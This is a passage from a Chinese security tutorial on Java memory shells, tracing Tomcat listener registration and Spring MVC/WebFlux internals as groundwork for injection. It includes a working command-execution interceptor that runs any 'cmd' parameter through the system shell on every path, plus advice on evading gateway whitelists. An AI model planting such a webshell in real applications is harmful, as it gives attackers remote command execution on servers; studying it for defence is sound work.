![](../../.resource/remote/0c03176035e32e611c4e15cd716326e53ce598a9eed4bab31109093e11c182ab.png)

往下翻可以看到`org.apache.catalina.core.StandardContext#listenerStart`方法的调用：

![](../../.resource/remote/5a9368b7f97dbdf2033616860dee04261bba2817c67adb21196772e648cc3809.png)

代码写的通俗易懂，主要有两个事情要干，一是通过`findApplicationListeners`找到这些`Listerner`的名字；二是实例化这些`listener`：

![](../../.resource/remote/89d54c90a139ece067588abadabda349bcbe3b0834c70aa8eb91385712201c22.png)

接着就是分类摆放，我们需要的`ServletRequestListener`被放在了`eventListeners`里面：

![](../../.resource/remote/c6812a4b5a718f0bb94ab0d9c1e460d50e8216975e9c7c419096f3aab997b59d.png)

分类摆放完了之后，干这样一件事情：

```
eventListeners.addAll(Arrays.asList(getApplicationEventListeners()));


```

`Arrays.asList(...)` 好理解，意思就是将数组转换为列表；`eventListeners.addAll(...)`也好理解，意思就是将括号里面的内容添加到之前实例化的监听器列表 `eventListeners` 中。关于括号里边的`org.apache.catalina.core.StandardContext#getApplicationEventListeners`这个方法，我们点进去看，代码如下：

```
@Override
public Object[] getApplicationEventListeners() {
    return applicationEventListenersList.toArray();
}


```

也很简单明了，就是把`applicationEventListenersList`转换成一个包含任意类型对象的数组，也就是一个可能包含各种类型的应用程序事件监听器的数组。

那这总结起来就一句话，就是`Listener`有两个来源，一是根据`web.xml`文件或者`@WebListener`注解实例化得到的`Listener`；二是`applicationEventListenersList`中的`Listener`。前面的我们肯定没法控制，因为这是给开发者用的，不是给黑客用的哈哈哈。那就找找看，有没有类似之前我们用到的`addFilterConfig`这种函数呢？当然是有的，`ctrl+左键`往上找：

![](../../.resource/remote/f2d71a6087e075f4c120d19047312e1f4101761ff2ea54a408ab358f1342d909.png)![](../../.resource/remote/d91710e53353700541cbb5ebe6276003c32825fedb2dd179d502ccbb0e90b98d.png)

方法名字叫做`addApplicationEventListener`，在`StandardContext.java`里面，代码如下，完美符合我们的需求，真是太哇塞了：

```
public void addApplicationEventListener(Object listener) {
    applicationEventListenersList.add(listener);
}


```

2.10 简单的 spring 项目搭建
--------------------

新建个项目，设置`Server URL`为`https://start.aliyun.com/`：

![](../../.resource/remote/fbf6a8669e447b2af1a0c98c41a97526512f707ede214d4b10fb2d252397599d.png)![](../../.resource/remote/f80cbc9562f19bdf3f20eb695f414eff8dcbace29b84887cefacd5f57a044fdc.png)

等待依赖解析完成：

![](../../.resource/remote/a67c9508fe69877e443f6cd030957814e6edd56f9682af6945d1b98a607f83e9.png)

这里给我们准备了一个示例，我们可以直接跑起来：

![](../../.resource/remote/5e2193f66ea7ce1bc44dc1bbcb1b1471646be0d1b36fcd6227ad9c99513ce701.png)

### 2.10.1 编写一个简单的 Spring Controller

```
package org.example.springcontrollermemoryshellexample.demos.web;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class TestController {
    @ResponseBody
    @RequestMapping("/")
    public String test(){
        return "hello world";
    }
}


```

非常地简单：

![](../../.resource/remote/5a926911e4cdc6ec81072164ef5609b6de12c1b65676ad387bbf882a6ac42931.png)

### 2.10.2 编写一个简单的 Spring Interceptor

`TestInterceptor.java`：

```
package org.example.springcontrollermemoryshellexample.demos.web;

import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class TestInterceptor extends HandlerInterceptorAdapter {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getParameter("cmd");
        if(cmd != null){
            try {
                java.io.PrintWriter writer = response.getWriter();
                String output = "";
                ProcessBuilder processBuilder;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    processBuilder = new ProcessBuilder("cmd.exe", "/c", cmd);
                }else{
                    processBuilder = new ProcessBuilder("/bin/sh", "-c", cmd);
                }
                java.util.Scanner inputScanner = new java.util.Scanner(processBuilder.start().getInputStream()).useDelimiter("\\A");
                output = inputScanner.hasNext() ? inputScanner.next(): output;
                inputScanner.close();
                writer.write(output);
                writer.flush();
                writer.close();
            } catch (Exception ignored){}
            return false;
        }
        return true;
    }
}


```

`WebConfig.java`：

```
package org.example.springcontrollermemoryshellexample.demos.web;

import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
public class WebConfig implements WebMvcConfigurer {

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(new TestInterceptor()).addPathPatterns("/**");
    }
}


```

`Controller`就是之前写的`TestController.java`，运行后访问`http://127.0.0.1:8080/?cmd=whoami`：

![](../../.resource/remote/c8ddfebfcd55914eecf6300b8789c3917170afcb439c68ae029c91e3d84f7238.png)

### 2.10.3 编写一个简单的 Spring WebFlux 的 Demo（基于 Netty）

我们先聊聊怎么自己写一个`Spring WebFlux`框架的`demo`。

这里我们新建一个`SpringBoot`项目，取名`WebFluxMemoryShellDemo`：

![](../../.resource/remote/3a0190c6d1ca7a36e5f599b8d7003175f29cfde081793fddc7df295cf4f1a802.png)

这里选择`Spring Reactive Web`：

![](../../.resource/remote/161a7ab3c804349cfab179f90936a7f1693ea4f959fad0cf27526acb97170538.png)

接着新建两个文件，这里为了方便，我把这两个文件放到`hello`文件夹下。

`GreetingHandler.java`：

```
package org.example.webfluxmemoryshelldemo.hello;

import org.springframework.http.MediaType;
import org.springframework.stereotype.Component;
import org.springframework.web.reactive.function.BodyInserters;
import org.springframework.web.reactive.function.server.ServerRequest;
import org.springframework.web.reactive.function.server.ServerResponse;
import reactor.core.publisher.Mono;

@Component
public class GreetingHandler {
    public Mono<ServerResponse> hello(ServerRequest request) {
        return ServerResponse.ok().contentType(MediaType.TEXT_PLAIN).body(BodyInserters.fromValue("Hello, Spring!"));
    }
}


```

`GreetingRouter.java`：

```
package org.example.webfluxmemoryshelldemo.hello;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.MediaType;
import org.springframework.web.reactive.function.server.*;

@Configuration
public class GreetingRouter {
    @Bean
    public RouterFunction<ServerResponse> route(GreetingHandler greetingHandler) {
        return RouterFunctions.route(RequestPredicates.GET("/hello").and(RequestPredicates.accept(MediaType.TEXT_PLAIN)), greetingHandler::hello);
    }
}


```

我们可以新建`main/resources`文件夹，然后新建`application.properties`，通过`server.port`来控制`netty`服务的端口：

![](../../.resource/remote/6536f4dd67e795e2a9a1a1034f959e86213268df0f5ca03ed1ad32d51592d677.png)

接着我们运行：

![](../../.resource/remote/346e6d26c0f673b2ac322f0bd1ebca61e12b6b09809e3c9637bde280d35938ba.png)

这里我从`github`上找了一个项目，也可以很好地帮助我们理解这个框架是如何使用的，它采用的是`Netty`+`SpringWebFlux`：

> https://github.com/Java-Techie-jt/springboot-webflux-demo

![](../../.resource/remote/f628005cdd5d9f20fcadc1eee98d32b6fad9245e3c1681e0fd8fc1b112f28772.png)

随便访问个路由。例如`http://127.0.0.1:9191/customers/stream`：

![](../../.resource/remote/338d27a2e390dc95e5918c63d656b612679aaa7a479e14484bb8d9ebceff35ab.gif)

2.11 Spring MVC 介绍
------------------

如果想要深入理解`Spring MVC`框架型内存马，那么对`Spring MVC`的基础了解是非常必要的，本节就从源码层面和大家简单聊聊这个框架。

首先引用《`Spring in Action`》上的一张图（这里我重制了一下）来了解`Spring MVC`的核心组件和大致处理流程（不过我在第五版书上貌似没有找到这张图，有找到的小伙伴可以公众号后台私信我）：

![](../../.resource/remote/9e5782a901c43f37eec8a23c680b4a8665dafde9c09b209ee13f1e875d2efdba.png)

可以看到，这里有一堆名词，我们一一来看：

*   `DispatcherServlet`是前端控制器，它负责接收`Request`并将`Request`转发给对应的处理组件；
    
*   `HandlerMapping`负责完成`url`到`Controller`映射，可以通过它来找到对应的处理`Request`的`Controller`；
    
*   `Controller`处理`Request`，并返回`ModelAndVIew`对象，`ModelAndView`是封装结果视图的组件；
    
*   ④~⑦表示视图解析器解析`ModelAndView`对象并返回对应的视图给客户端。
    

还有一个概念需要了解，就是`IOC`容器，因为这个名词会在本文后面的内容中提及。

`IOC`（控制反转）容器是`Spring`框架的核心概念之一，它的基本思想是将对象的创建、组装、管理等控制权从应用程序代码反转到容器，使得应用程序组件无需直接管理它们的依赖关系。`IOC`容器主要负责对象的创建、依赖注入、生命周期管理和配置管理等。`Spring`框架提供了多种实现`IOC`容器的方式，下面讲两种常见的：

*   `BeanFactory`：`Spring`的最基本的`IOC`容器，提供了基本的`IOC`功能，只有在第一次请求时才创建对象。
    
*   `ApplicationContext`：这是`BeanFactory`的扩展，提供了更多的企业级功能。`ApplicationContext`在容器启动时就预加载并初始化所有的单例对象，这样就可以提供更快的访问速度。
    

### 2.11.1 Spring MVC 九大组件

这九大组件需要有个印象：

`DispatcherServlet`（派发`Servlet`）：负责将请求分发给其他组件，是整个`Spring MVC`流程的核心；`HandlerMapping`（处理器映射）：用于确定请求的处理器（`Controller`）；`HandlerAdapter`（处理器适配器）：将请求映射到合适的处理器方法，负责执行处理器方法；`HandlerInterceptor`（处理器拦截器）：允许对处理器的执行过程进行拦截和干预；`Controller`（控制器）：处理用户请求并返回适当的模型和视图；`ModelAndView`（模型和视图）：封装了处理器方法的执行结果，包括模型数据和视图信息；`ViewResolver`（视图解析器）：用于将逻辑视图名称解析为具体的视图对象；`LocaleResolver`（区域解析器）：处理区域信息，用于国际化；`ThemeResolver`（主题解析器）：用于解析`Web`应用的主题，实现界面主题的切换。

### 2.11.2 简单的源码分析

#### 2.11.2.1 九大组件的初始化

首先是找到`org.springframework.web.servlet.DispatcherServlet`，可以看到里面有很多组件的定义和初始化函数以及一些其他的函数：

![](../../.resource/remote/8c03b10cc88b5b5b3e72319c958884af4bf98bfaccf7d8bceb8fbb7221351517.png)

但是没有`init()`函数，我们翻看其父类`FrameworkServlet`的父类`org.springframework.web.servlet.HttpServletBean`的时候发现有`init`函数：

![](../../.resource/remote/9b3faf449fcf9929b7e3b4a0dccce1fb576a4ebbfd4a43589d7dc32ec2108231.png)

代码如下：

```
@Override
public final void init() throws ServletException {

    // Set bean properties from init parameters.
    PropertyValues pvs = new ServletConfigPropertyValues(getServletConfig(), this.requiredProperties);
    if (!pvs.isEmpty()) {
        try {
            BeanWrapper bw = PropertyAccessorFactory.forBeanPropertyAccess(this);
            ResourceLoader resourceLoader = new ServletContextResourceLoader(getServletContext());
            bw.registerCustomEditor(Resource.class, new ResourceEditor(resourceLoader, getEnvironment()));
            initBeanWrapper(bw);
            bw.setPropertyValues(pvs, true);
        }
        catch (BeansException ex) {
            if (logger.isErrorEnabled()) {
                logger.error("Failed to set bean properties on servlet '" + getServletName() + "'", ex);
            }
            throw ex;
        }
    }

    // Let subclasses do whatever initialization they like.
    initServletBean();
}


```

先是从`Servlet`的配置中获取初始化参数并创建一个`PropertyValues`对象，然后设置`Bean`属性；关键在最后一步，调用了`initServletBean`这个方法。

我们点进去之后发现该函数并没有写任何内容，说明应该是子类继承的时候`override`了该方法：

![](../../.resource/remote/fd21dad39c8b9918f88ebf33178d39a6d253af865dfa9dcb968c68f8c045f87d.png)

果不其然，我们在`org.springframework.web.servlet.FrameworkServlet`中成功找到了该方法：

![](../../.resource/remote/f9fb27c26991db86e48071b8373f1b1f90d8fd84a6d54d5ca2074396ff4cad0b.png)

代码如下：

```
@Override
protected final void initServletBean() throws ServletException {
    getServletContext().log("Initializing Spring " + getClass().getSimpleName() + " '" + getServletName() + "'");
    if (logger.isInfoEnabled()) {
        logger.info("Initializing Servlet '" + getServletName() + "'");
    }
    long startTime = System.currentTimeMillis();

    try {
        this.webApplicationContext = initWebApplicationContext();
        initFrameworkServlet();
    }
    catch (ServletException | RuntimeException ex) {
        logger.error("Context initialization failed", ex);
        throw ex;
    }

    if (logger.isDebugEnabled()) {
        String value = this.enableLoggingRequestDetails ?
                "shown which may lead to unsafe logging of potentially sensitive data" :
                "masked to prevent unsafe logging of potentially sensitive data";
        logger.debug("enableLoggingRequestDetails='" + this.enableLoggingRequestDetails +
                "': request parameters and headers will be " + value);
    }

    if (logger.isInfoEnabled()) {
        logger.info("Completed initialization in " + (System.currentTimeMillis() - startTime) + " ms");
    }
}


```

这段代码的`log`和计时部分就不说了，我们捡关键的说。它先是调用`initWebApplicationContext`方法，初始化`IOC`容器，在初始化的过程中，会调用到这个`onRefresh`方法，一般来说这个方法是在容器刷新完成后被调用的回调方法，它执行一些在应用程序启动后立即需要完成的任务：

![](../../.resource/remote/a977fd079dfaad3794fb5f281355680bef7ae96da6713e6a18913ec83ec0af53.png)

跟入该方法，可以看到其中默认为空：

![](../../.resource/remote/b7cd56f6e82bbdadb85c85fe026402bc006e81f7b999caf7b451df68bdb74403.png)

说明在它的子类中应该会有`override`，果然我们定位到了`org.springframework.web.servlet.DispatcherServlet#` 方法：

![](../../.resource/remote/5834c628f35ea94951f053e6c6c830ef40457257427a79cbd3708f4860dbb285.png)

这一下就明了了起来，这不是我们之前提到的九大组件嘛，到这一步就完成了`Spring MVC`的九大组件的初始化。

#### 2.11.2.2 url 和 Controller 的关系的建立

你可能会有这样的一个疑惑：我们是用`@RequestMapping("/")`注解在方法上的，那`Spring MVC`是怎么根据这个注解就把对应的请求和这个方法关联起来的？

从上面的九大组件的初始化中可以看到，有个方法就叫做`initHandlerMappings`，我们点进去详细看看：

![](../../.resource/remote/049d847b0688d381032b3750c475306c6a817cfb714c654e70cb383fd627e3ed.png)

这段代码和自带的注释写的也比较通俗易懂，分为两部分，第一部分是去`ApplicationContext`（包括`ancestor contexts`）里面找所有实现了`HandlerMappings`接口的类，如果找到了至少一个符合条件的`HandlerMapping bean`，那就把它的值转化为列表，并按照 Java 的默认排序机制对它们进行排序，最后将排序后的列表赋值给 `this.handlerMappings`；那如果没有找到，`this.handlerMappings`就依然保持为`null`；如果不需要检测所有处理程序映射，那就尝试从`ApplicationContext`中获取名称为 `handlerMapping` 的`bean`，如果成功获取到了则将其作为单一元素的列表赋值给 `this.handlerMappings`，如果获取失败了，那也没关系，因为人家注释里面讲的很明白，会添加一个默认的`HandlerMapping`，这也就是我们要讲的第二部分的代码。

第二部分说的是，如果之前一套操作下来，`this.handlerMappings`还是为`null`，那么就调用 `getDefaultStrategies` 方法去获取默认的`HandlerMapping`，并将其赋给 `this.handlerMappings`。

这么一看的话，`org.springframework.web.servlet.DispatcherServlet#getDefaultStrategies`这个方法还是挺关键的，我们点进去看看：

![](../../.resource/remote/32cca4aeaa8561b4e7fb9b8c774df0215afe6f22a5a7e195e8e627dce74b4753.png)

这段代码挺有意思，先是加载资源文件，并将其内容以属性键值对的形式存储在`defaultStrategies`中；接下来从`strategyInterface`获取一个名称，然后用这个名称在`defaultStrategies`中查找相应的值，如果找到了，就将这个值按逗号分隔成类名数组，接着遍历这个类名数组，对于每个类名都执行以下两个操作：①尝试通过`ClassUtils.forName`方法加载该类 ②使用`createDefaultStrategy`方法创建该类的实例；最后将创建的策略对象添加到列表`strategies`中并返回。

那就很好奇了，这段代码中的`DEFAULT_STRATEGIES_PATH`里面有啥？`Ctrl+左键`追踪：

![](../../.resource/remote/adacc6ee37a60c0448ab46050c92e82a7d18627ac21f6e7b6c3ec811edfb6574.png)

原来是一个名叫`DispatcherServlet.properties`的文件，我们可以在左侧的依赖列表里面很快地翻到它，因为它应该是和`DispatcherServlet.java`在一块儿的：

![](../../.resource/remote/f015eeee6f079dcd92fde96434b198719ecd636695b4f853cf7f6b3afa6c2f81.png)

从文件内容中，我们可以很快地锁定关键信息：

```
org.springframework.web.servlet.HandlerMapping=org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping,\
	org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping,\
	org.springframework.web.servlet.function.support.RouterFunctionMapping


```

也就是说，会有三个值，分别是`BeanNameUrlHandlerMapping`、`RequestMappingHandlerMapping`和`RouterFunctionMapping`，我们一般用的是第二个，我们点进`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping`看一下：

![](../../.resource/remote/0f5c18a78eaafa8eaac408cd0ce7cfd3d8d277681fc35fda4f4aaf9e44d6af53.png)

它的父类`RequestMappingInfoHandlerMapping`的父类`AbstractHandlerMethodMapping`实现了`InitializingBean`这个接口，这个接口用于在`bean`初始化完成后执行一些特定的自定义初始化逻辑。

![](../../.resource/remote/0ff56d3327a7e428ead252062ded250b4ff7247e4fabb18eb3da49f90634f70b.png)

点进该接口，只有一个`afterPropertiesSet`方法，关于该方法的用途可以参考`https://www.python100.com/html/U711CO7MV79C.html`：

![](../../.resource/remote/71025711d0ae5251b46022cdeaebe1c45ab82f725f2f50bc9a27676141fc5f27.png)

那我们就看看`AbstractHandlerMethodMapping`它是具体咋实现`InitializingBean`的`afterPropertiesSet`的吧：

![](../../.resource/remote/d03f744ed01d713d5959358ebe8f96fa80182cffecdf2fa150e7761e8c61b35f.png)

重写的也很简单，调用`initHandlerMethods`这个方法，继续跟踪该方法：

![](../../.resource/remote/9c74679ef348b13cc7531574a43a15dc75b99c99b95e066c49bf58420a195558.png)

注释里面写的很清楚：扫描`ApplicationContext`中的`bean`，然后检测并注册`handler methods`。

我们在`org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#initHandlerMethods`这里打下断点进行调试，到图中这一步之后`step into`：

![](../../.resource/remote/12dc2b8ac169016f55795a604e772bdcca570591b0faff5443f44c04a51321e3.png)

我们来看`org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#processCandidateBean`这个方法的具体逻辑：

![](../../.resource/remote/05a9f177fab52b12b6617248a48c9e0b5e70c114ede3298c663e311d44c2e139.png)

这里我们自然很好奇，这个`isHandler`是判断啥的，我们点进去看看：

![](../../.resource/remote/a4c59adaee1ca1f47e36a9c7e2ea4e31a7827bec7d59f582517e65719d62a18f.png)

可以看到，这里并没有给出实现，说明子类中应该会给出`override`，于是直接找到了`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#isHandler`：

![](../../.resource/remote/e213f8c38a76caa2845887a6802bc041793697d0d4601a9db23085078ad40722.png)

很明显，`isHandler`是用来检测给定的`beanType`类是否带有`Controller`注解或者`RequestMapping`注解。

解决了这个，继续往后看，后面是调用了`detectHandlerMethods`这个方法，我们点进去看看：

![](../../.resource/remote/58218b7b565bf22273e01d0d32822050bc04aba4eaec7619be2c8108fb977ff7.png)

我们分开来看，首先是这行代码，它是综合起来写的，意思是说，先判断`handler`是否是字符串类型，如果是，则通过`ApplicationContext`获取它的类型；否则，直接获取`handler`的类型。：

```
Class<?> handlerType = (handler instanceof String ?
            obtainApplicationContext().getType((String) handler) : handler.getClass());


```

然后是这部分：

```
Class<?> userType = ClassUtils.getUserClass(handlerType);
Map<Method, T> methods = MethodIntrospector.selectMethods(userType,
        (MethodIntrospector.MetadataLookup<T>) method -> {
            try {
                return getMappingForMethod(method, userType);
            }
            catch (Throwable ex) {
                throw new IllegalStateException("Invalid mapping on handler class [" +
                        userType.getName() + "]: " + method, ex);
            }
        });


```

先是获取处理器的用户类，用户类是没有经过代理包装的类，这样就可以确保获取到的是实际处理请求的类；然后是这个`selectMethods`方法，这个方法有两个参数，第一个参数就是用户类，第二个参数是一个回调函数。关键就在于理解这个回调函数的作用。对于每个方法，它会尝试调用`getMappingForMethod`来获取方法的映射信息。

我们点进这个方法，发现它是一个抽象方法：

![](../../.resource/remote/a5357489a633b871da326d5d12d028891746563e7d084a0bea23beffa628ab84.png)

那就去看看他的子类中有没有对应的实现，直接定位到`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#getMappingForMethod`：

![](../../.resource/remote/5a64b37bde4ee195b2007da9bef47e5c7b25db16964b0a7629b2821070da8c04.png)

我们在下图所示位置打断点调试：

![](../../.resource/remote/11b299fac15ec9b7ff43613c58da948e67b813649ca8c12180342ccf4be9b452.png)

分开来看，首先是第一行：

```
RequestMappingInfo info = createRequestMappingInfo(method);


```

解析`Controller`类的方法中的注解，生成一个对应的`RequestMappingInfo`对象。我们可以`step into`进入`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#createRequestMappingInfo(java.lang.reflect.AnnotatedElement)`方法：

![](../../.resource/remote/576702bbd186d0d5dabbb98fef4585d84b19eed6416676a7fbd03cf0017a8358.png)![](../../.resource/remote/60664ccfa8b9997e2768ad9ccf09d380f12b4e01830c54887d29b3ad2bf32629.png)

可以看到这个`info`里面保存了访问该方法的`url pattern`是`"/"`，也就是我们在`TestController.java`所想要看到的当`@RequestMapping("/")`时，调用`test`方法。

继续一步步往下走，可以看到走到了`org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#detectHandlerMethods`的最后：

![](../../.resource/remote/3c191f2c7ddd49d1e89b5d6c3fefb27628bc83f616871cbe7b8f037e1f2c0c9c.png)

直接看`lambda`表达式里面的内容：

```
Method invocableMethod = AopUtils.selectInvocableMethod(method, userType);
registerHandlerMethod(handler, invocableMethod, mapping);


```

意思是，先用`selectInvocableMethod`方法根据`method`和`userType`选择出一个可调用的方法，这样是为了处理可能存在的代理和`AOP`的情况，确保获取到的是可直接调用的原始方法；然后把`bean`、`Method`和`RequestMappingInfo`注册进`MappingRegistry`。

![](../../.resource/remote/c47230f699de49f20687d0bdefeac3a944de52a222b9bbc8c214b220baade3ab.png)

到这里，`url`和`Controller`之间的关系是如何建立的问题就解决了。

#### 2.11.2.3 Spring Interceptor 引入与执行流程分析

我们回顾之前聊到的`Controller`的思路和下面的`4.1`节中所展示的`Controller`内存马，可以考虑到这样一个问题：

> 随着微服务部署技术的迭代演进，大型业务系统在到达真正的应用服务器的时候，会经过一些系列的网关、复杂均衡以及防火墙等。所以如果你新建的`shell`路由不在这些网关的白名单中，那么就很有可能无法访问到，在到达应用服务器之前就会被丢弃。我们要达到的目的就是在访问正常的业务地址之前，就能执行我们的代码。所以，在注入`java`内存马时，尽量不要使用新的路由来专门处理我们注入的`webshell`逻辑，最好是在每一次请求到达真正的业务逻辑前，都能提前进行我们`webshell`逻辑的处理。在`tomcat`容器下，有`filter`、`listener`等技术可以达到上述要求。那么在 `spring` 框架层面下，有办法达到上面所说的效果吗？      ——摘编自`https://github.com/Y4tacker/JavaSec/blob/main/5.内存马学习/Spring/利用intercetor注入Spring内存马/index.md`和`https://landgrey.me/blog/19/`

答案是当然有，这就是我们要讲的`Spring Interceptor`，`Spring`框架中的一种拦截器机制。

那就不禁要问了：这个`Spring Interceptor`和我们之前所说的`Filter`的区别是啥？

> 参考：https://developer.aliyun.com/article/925400

主要有以下六个方面：

<table><thead><tr><th>主要区别</th><th>拦截器</th><th>过滤器</th></tr></thead><tbody><tr><td>机制</td><td><code>Java</code>反射机制</td><td>函数回调</td></tr><tr><td>是否依赖<code>Servlet</code>容器</td><td>不依赖</td><td>依赖</td></tr><tr><td>作用范围</td><td>对<code>action</code>请求起作用</td><td>对几乎所有请求起作用</td></tr><tr><td>是否可以访问上下文和值栈</td><td>可以访问</td><td>不能访问</td></tr><tr><td>调用次数</td><td>可以多次被调用</td><td>在容器初始化时只被调用一次</td></tr><tr><td><code>IOC</code>容器中的访问</td><td>可以获取<code>IOC</code>容器中的各个<code>bean</code>（基于<code>FactoryBean</code>接口）</td><td>不能在<code>IOC</code>容器中获取<code>bean</code></td></tr></tbody></table>

我们在`2.10.2`节中给出的`TestInterceptor.java`的`preHandle`函数这里下断点，然后访问`http://127.0.0.1:8080/?cmd=whoami`进入调试：

![](../../.resource/remote/2b67e4befad0239813f36954072bf45cbb92b0f2f66f21dd356864b6dd4d5410.png)

一步步步入调试之后，发现进入`org.springframework.web.servlet.DispatcherServlet#doDispatch`方法：

![](../../.resource/remote/310206dfe9a120fabe53aecc957aa18d7e2ab2f68168cd33e9567d2f4873f31a.png)

我们在`doDispatch`方法的第一行下断点，重新访问页面调试：

![](../../.resource/remote/a62e21ed75222bbfdeefc3c2dc6fe5a29087f4cc6fb24a6614e55e94cb8db8c7.png)

看到了调用了`getHandler`这个函数，它的注释写的简单易懂：确定处理当前请求的`handler`，我们`step into`看看：

![](../../.resource/remote/0a35eeeb529f70d2b2e01ccc7f5b9d7ba87d4bd5cc13d9bd1830bafd43f8d43f.png)

通过遍历当前`handlerMapping`数组中的`handler`对象，来判断哪个`handler`来处理当前的`request`对象：

![](../../.resource/remote/d975b9c15e691ae12e3692c7ad9d5dd050671f1b5c4f33d37483cc1f196dd6f9.png)

继续步入这个函数里面所用到的`mapping.getHandler`方法，也就是`org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler`：

![](../../.resource/remote/b2712bc14e77599e1b68ab54af8e64f52142f212c9e8d6cb137de5ab77b2e458.png)

代码简单易懂，先是通过`getHandlerInternal`来获取，如果获取不到，那就调用`getDefaultHandler`来获取默认的，如果还是获取不到，就直接返回`null`；然后检查`handler`是不是一个字符串，如果是，说明可能是一个`Bean`的名字，这样的话就通过`ApplicationContext`来获取对应名字的`Bean`对象，这样就确保 `handler` 最终会是一个合法的处理器对象；接着检查是否已经有缓存的请求路径，如果没有缓存就调用 `initLookupPath(request)` 方法来初始化请求路径的查找；最后通过 `getHandlerExecutionChain` 方法创建一个处理器执行链。

这么看下来，这个`getHandlerExecutionChain`方法很重要，我们步入看看：

![](../../.resource/remote/5b518e504c56ef8bbeb3ff906778865b18b7185bdfd945296c18bd2cfcd854b8.png)

遍历`adaptedInterceptors`，判断拦截器是否是`MappedInterceptor`类型，如果是那就看`MappedInterceptor`是否匹配当前请求，如果匹配则将其实际的拦截器添加到执行链中，如果不是这个类型的那就直接将拦截器添加到执行链中。

再回到之前的`getHandler`方法中来，看看它的后半段：

![](../../.resource/remote/fe6cca96f21466d9c2995585a6beb23d84ff87dc43a78b8a64df472d08e54d0d.png)

主要都是处理跨域资源共享（`CORS`）的逻辑，只需要知道在涉及`CORS`的时候把`request`、`executionChain`和`CORS`配置通过`getCorsHandlerExecutionChain`调用封装后返回就行了。

一步步执行回到一开始的`getHandler`中，这里就是调用`org.springframework.web.servlet.HandlerExecutionChain#applyPreHandle`方法来遍历所有拦截器进行预处理，后面的代码就基本不需要了解了：

![](../../.resource/remote/1a1c78e3ae8e0911622b81ccb05be36b7dab95d5b3e2c5292fe527ee57c4d81b.png)

2.12 Spring WebFlux 介绍与代码调试分析
-----------------------------

`SpringWebFlux`是`Spring Framework 5.0`中引入的新的响应式`web`框架。传统的`Spring MVC`在处理请求时是阻塞的，即每个请求都会占用一个线程，如果有大量请求同时到达，就需要大量线程来处理，可能导致资源耗尽。为了解决这个问题，`WebFlux`引入了非阻塞的响应式编程模型，通过使用异步非阻塞的方式处理请求，能够更高效地支持大量并发请求，提高系统的吞吐量；并且它能够轻松处理长连接和`WebSocket`，适用于需要保持连接的应用场景，如实时通讯和推送服务；在微服务架构中，服务之间的通信往往需要高效处理，`WebFlux`可以更好地适应这种异步通信的需求。

关于`Reactive`和`Spring WebFlux`的相关知识，可以参考知乎上的这篇文章，讲的通俗易懂，很透彻：

> https://zhuanlan.zhihu.com/p/559158740

`WebFlux`框架开发的接口返回类型必须是`Mono<T>`或者是`Flux<T>`。因此我们第一个需要了解的就是什么是`Mono`以及什么是`Flux`。

### 2.12.1 什么是 Mono？

`Mono`用来表示包含`0`或`1`个元素的异步序列，它是一种异步的、可组合的、能够处理异步数据流的类型。比方说当我们发起一个异步的数据库查询、网络调用或其他异步操作时，该操作的结果可以包装在`Mono`中，这样就使得我们可以以响应式的方式处理异步结果，而不是去阻塞线程等待结果返回，就像我们在`2.10.3`节中的那张`gif`图中所看到的那样。

下面我们来看看`Mono`常用的`api`：

<table><thead><tr><th>API</th><th>说明</th><th>代码示例</th></tr></thead><tbody><tr><td><code>Mono.just(T data)</code></td><td>创建一个包含指定数据的 <code>Mono</code>。</td><td><code>Mono&lt;String&gt; mono = Mono.just("Hello, Mono!");</code></td></tr><tr><td><code>Mono.empty()</code></td><td>创建一个空的 <code>Mono</code>。</td><td><code>Mono&lt;Object&gt; emptyMono = Mono.empty();</code></td></tr><tr><td><code>Mono.error(Throwable error)</code></td><td>创建一个包含错误的 <code>Mono</code>。</td><td><code>Mono&lt;Object&gt; errorMono = Mono.error(new RuntimeException("Something went wrong"));</code></td></tr><tr><td><code>Mono.fromCallable(Callable&lt;T&gt; supplier)</code></td><td>从 Callable 创建 <code>Mono</code>，表示可能抛出异常的异步操作。</td><td><code>Mono&lt;String&gt; resultMono = Mono.fromCallable(() -&gt; expensiveOperation());</code></td></tr><tr><td><code>Mono.fromRunnable(Runnable runnable)</code></td><td>从 Runnable 创建 <code>Mono</code>，表示没有返回值的异步操作。</td><td><code>Mono&lt;Void&gt; runnableMono = Mono.fromRunnable(() -&gt; performAsyncTask());</code></td></tr><tr><td><code>Mono.delay(Duration delay)</code></td><td>在指定的延迟后创建一个空的 <code>Mono</code>。</td><td><code>Mono&lt;Object&gt; delayedMono = Mono.delay(Duration.ofSeconds(2)).then(Mono.just("Delayed Result"));</code></td></tr><tr><td><code>Mono.defer(Supplier&lt;? extends Mono&lt;? extends T&gt;&gt; supplier)</code></td><td>延迟创建 <code>Mono</code>，直到订阅时才调用供应商方法。</td><td><code>Mono&lt;String&gt; deferredMono = Mono.defer(() -&gt; Mono.just("Deferred Result"));</code></td></tr><tr><td><code>Mono.whenDelayError(Iterable&lt;? extends Mono&lt;? extends T&gt;&gt; monos)</code></td><td>将一组 <code>Mono</code> 合并为一个 <code>Mono</code>，当其中一个出错时，继续等待其他的完成。</td><td><code>Mono&lt;String&gt; resultMono = Mono.whenDelayError(Arrays.asList(mono1, mono2, mono3));</code></td></tr><tr><td><code>Mono.map(Function&lt;? super T, ? extends V&gt; transformer)</code></td><td>对 <code>Mono</code> 